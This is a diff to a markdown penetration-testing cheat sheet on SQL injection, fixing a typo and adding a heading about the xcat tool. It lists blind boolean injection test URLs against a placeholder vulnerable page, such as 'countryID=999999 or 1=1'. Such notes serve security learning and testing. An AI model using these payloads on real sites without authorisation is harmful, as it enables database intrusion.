@@ -14,7 +14,7 @@ http://<website>/vulnpage.php?countryID=a'
 ```
 
 ### Blind bolean injection
-You can check if there is a valid injection by checking with commands if there is no error messages. You can check whenether you get a valid response back or not depending on if it's TRUE or FAL
+You can check if there is a valid injection by checking with commands if there is no error messages. You can check whenether you get a valid response back or not depending on if it's TRUE or FALSE
 ```
 ## TRUE 
 http://<website>/vulnpage.php?countryID=999999 or 1=1
@@ -23,3 +23,8 @@ http://<website>/vulnpage.php?countryID=999999 or "2" or "2"
 http://<website>/vulnpage.php?countryID=999999 or 1=2
 http://<website>/vulnpage.php?countryID=999999 or "1"="2"
 ```
+
+# Enumerate Blind Bolean injections with xcat
+You can see here how to use xcat (Tool for injection auto blind bolean to extract) 
+
+                                                  [[Xcat]]
